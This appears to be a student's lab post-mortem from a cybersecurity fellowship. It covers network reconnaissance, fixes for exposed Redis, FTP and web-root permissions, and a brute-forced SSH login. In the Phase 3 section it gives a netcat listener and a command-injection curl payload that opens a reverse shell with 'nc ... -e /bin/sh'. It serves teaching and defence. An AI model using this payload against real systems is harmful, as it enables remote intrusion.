# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Jane thee TA
**Date:** May 14, 2026
**Repository:** https://github.com/janepierresgithub/tkh-ifcs-p1-student
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

Triage Network: During reconnaissance of the 172.100.0.0/24 subnet, four hosts were identified as live. The gateway at 172.100.0.1 exposed SSH, NetBIOS, and Samba services on ports 22, 139, and 445 respectively. Host 172.100.0.12 was running an unauthorized FTP service on port 21 via vsftpd 3.0.2. Hosts 172.100.0.11 and 172.100.0.13 were alive but returned no open ports on a default scan, requiring targeted port specification to reveal the Redis service on 172.100.0.11 and a filesystem misconfiguration on 172.100.0.13 (Lyon et al., 2008).

Breach Network: Reconnaissance of the 172.80.0.0/24 subnet revealed two live hosts. The gateway at 172.80.0.1 exposed SSH, NetBIOS, and Samba services. Host 172.80.0.10 was running OpenSSH 10.2 on port 22, presenting a viable brute-force attack surface given the absence of observable rate limiting or account lockout policies during initial scanning (van Hauser & Maciejak, 2023).

Exploitation Network: Reconnaissance of the 172.60.0.0/24 subnet revealed two live hosts. The gateway at 172.60.0.1 exposed SSH, NetBIOS, and Samba services. Host 172.60.0.10 was running a Python-based HTTP server on port 80, identified as BaseHTTPServer 0.6. The application accepted GET requests containing a cmd parameter, indicating a potential command injection vulnerability accessible via the /exec endpoint (OWASP Foundation, 2021).

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
Server 1 — 172.100.0.11

Vulnerability: Redis key-value store exposed on 0.0.0.0:6379 — accessible from any host on the network
Remediation: docker exec -it broken_server_1 /bin/sh then iptables -A INPUT -p tcp --dport 6379 -j DROP
Before: 0.0.0.0:6379 LISTEN
After: DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:6379
Analysis: An exposed Redis instance operating without authentication allows any network-adjacent actor to read, write, or delete all stored data (Redis Ltd., 2024). In an enterprise environment, this misconfiguration could result in complete data exfiltration, session hijacking, or remote code execution via Redis configuration manipulation. The Center for Internet Security identifies unauthenticated database exposure as a critical risk requiring immediate remediation (CIS, 2023).

### Server 2 — 172.100.0.12
Vulnerability: Unauthorized vsftpd FTP service running on port 21
Remediation: docker exec -it broken_server_2 /bin/sh then kill 21
Before: /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf running as PID 21
After: Container stopped — process terminated
Analysis: An unauthorized FTP service represents an unmanaged attack surface that bypasses organizational security controls (SANS Institute, 2024). FTP transmits credentials in plaintext, making authentication data trivially interceptable via network sniffing. In an enterprise environment, rogue services of this nature indicate either a critical misconfiguration or a potential backdoor installed by a threat actor during an earlier stage of compromise.

### Server 3 — 172.100.0.13
Vulnerability: /var/www/html directory set to 777 — world-writable
Remediation: docker exec -it broken_server_3 /bin/sh then chmod 755 /var/www/html
Before: drwxrwxrwx /var/www/html
After: drwxr-xr-x /var/www/html
Analysis: A world-writable web root directory allows any user — authenticated or otherwise — to plant malicious files, replace legitimate web content, or upload web shells for persistent access (OWASP Foundation, 2021). In an enterprise environment, this misconfiguration could enable a complete web server compromise and serve as a foothold for lateral movement across the internal network. The principle of least privilege requires that web server directories be writable only by the owning process (NIST, 2020).
---

## Phase 2: The Breach
Username: root
Password: admin123
Timestamp: [paste exact line from your auth.log]
Attacker IP: 172.80.0.1
iptables rule: iptables -A INPUT -p tcp -s 172.80.0.1 -j DROP

A single iptables block rule addresses only the known attacker IP address and does not prevent re-entry from an alternate source address, a compromised internal host, or a different protocol (Cheswick et al., 2003). A real security operations center would deploy complementary controls including automated brute-force detection via tools such as fail2ban, multi-factor authentication to eliminate password-based attack vectors entirely, and SIEM alerting configured to flag repeated authentication failures in real time (SANS Institute, 2024).

---

## Phase 3: Full Spectrum

Listener: nc -lvnp 4444
Payload: curl "http://172.60.0.10/exec?cmd=nc%20172.60.0.1%204444%20-e%20/bin/sh"
Command injection explanation: Command injection occurs when user-supplied input is passed directly to a system shell without sanitization. This application appends the value of the cmd URL parameter directly to os.system(), allowing an attacker to execute arbitrary operating system commands in the context of the web server process.

The Lockdown Command: iptables -A INPUT -s 172.60.0.1 -j DROP
PID: 1
User-Agent: curl/8.5.0
Executing this attack revealed that the application's failure to sanitize user-supplied input creates a direct pathway from an HTTP request to operating system command execution (OWASP Foundation, 2021). A defender who understands this attack vector immediately recognizes that server-side input validation is the single most effective preventive control — specifically, an allowlist restricting the cmd parameter to expected characters would have prevented the exploit entirely before a single packet reached the operating system. Beyond input validation, running the web application as a non-privileged user would have significantly limited the blast radius of a successful exploit, consistent with the principle of least privilege (NIST, 2020). This operation demonstrates that offensive and defensive security knowledge are inseparable — understanding how to execute an attack is a prerequisite for understanding how to prevent it (Hutchins et al., 2011). The complete red-to-blue lifecycle executed in this project — reconnaissance, exploitation, forensic analysis, and perimeter hardening — reflects the operational model of modern purple team engagements (SANS Institute, 2024).

---

## References
Center for Internet Security. (2023). CIS controls version 8. 
    https://www.cisecurity.org/controls/v8

Cheswick, W. R., Bellovin, S. M., & Rubin, A. D. (2003). Firewalls 
    and internet security: Repelling the wily hacker (2nd ed.). 
    Addison-Wesley.

Hutchins, E. M., Cloppert, M. J., & Amin, R. M. (2011). 
    Intelligence-driven computer network defense informed by analysis 
    of adversary campaigns and intrusion kill chains. Lockheed Martin 
    Corporation. https://lockheedmartin.com/content/dam/lockheed-martin/
    rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf

Lyon, G., Fyodor, V., & The Nmap Project. (2008). Nmap network 
    scanning. Insecure.com LLC. https://nmap.org/book/

National Institute of Standards and Technology. (2020). Security and 
    privacy controls for information systems and organizations 
    (NIST SP 800-53 Rev. 5). U.S. Department of Commerce. 
    https://doi.org/10.6028/NIST.SP.800-53r5

OWASP Foundation. (2021). OWASP top ten. 
    https://owasp.org/www-project-top-ten/

Redis Ltd. (2024). Redis security. 
    https://redis.io/docs/management/security/

SANS Institute. (2024). Security operations center fundamentals. 
    https://www.sans.org/white-papers/

van Hauser, & Maciejak, D. (2023). THC-Hydra: A fast and flexible 
    online password cracking tool [Computer software]. 
    https://github.com/vanhauser-thc/thc-hydra